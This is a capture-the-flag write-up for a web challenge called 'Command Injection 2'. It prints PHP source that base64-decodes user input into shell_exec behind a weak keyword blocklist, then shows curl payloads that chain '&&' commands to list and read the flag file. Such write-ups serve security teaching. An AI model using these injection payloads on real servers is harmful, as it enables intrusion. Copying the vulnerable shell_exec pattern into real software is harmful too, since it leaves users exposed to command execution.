# Command Injection 2
Web

## Challenge 

I pretty much made your life harder now. Can you do it?

http://challs.hats.sg:1338

Flag format: flag{.+}

Challenge by: Gladiator


## Solution

http://challs.hats.sg:1338/

	ONLY BASE 64! COMMANDO 2
	HAH! I HAVE DEFENCES NOW!
	GET me a 'cmd'
	You can also GET 'SRC' if you want to..

http://challs.hats.sg:1338/?SRC

	<?php 
	    if(isset($_GET['SRC'])){
	        show_source("index.php");
	        die();
	    }
	    $cmd = base64_decode($_GET['cmd']);
	    if(!$cmd){
	        echo "ONLY BASE 64!";
	    }
	    else{
	        $f_array = explode(";", $cmd);
	        $s_array = explode(" ", $f_array[1]);
	        $forbidden = ['cat','less','more','head','tail','od','hexdump','echo','touch','>','<','>>','<<','|','\\','$','bash','sh','sed','awk'];
	        foreach ($s_array as $value) {
	            if(in_array($value, $forbidden)){
	                echo "HACKER!";
	                die();
	            }
	        }
	        $output = shell_exec("echo ". $cmd);
	        echo "<pre>$output</pre>";    
	    }

	?>
	<!DOCTYPE html>
	<html>
	<head>
	    <title></title>
	</head>
	<body>
	    COMMANDO 2<br>
	    HAH! I HAVE DEFENCES NOW!<br>
	    GET me a 'cmd'<br>
	    You can also GET 'SRC' if you want to..
	</body>
	</html>

There are forbidden chars. We cannot use `;` but we can use `&`

	$ curl -s http://challs.hats.sg:1338/?cmd=$(echo 'HELLO WORLD && ls -la ../../../flag' | base64) | html2text
	HELLO WORLD
	total 12
	drwxrwxr-x 1 root root 4096 Sep  6 18:42 .
	drwxr-xr-x 1 root root 4096 Sep  7 06:33 ..
	-rwxrwxr-x 1 root root   85 Sep  6 18:41 flag.txt

Cat the flag

	$ curl -s http://challs.hats.sg:1338/?cmd=$(echo 'HELLO WORLD && cat ../../../flag/flag.txt' | base64) | html2text
	HELLO WORLD
	flag
	{there_was_no_light!_in_orchard_roaddddddddddddddddddddddddddddddddddddddddddd}

## Flag

	flag{there_was_no_light!_in_orchard_roaddddddddddddddddddddddddddddddddddddddddddd}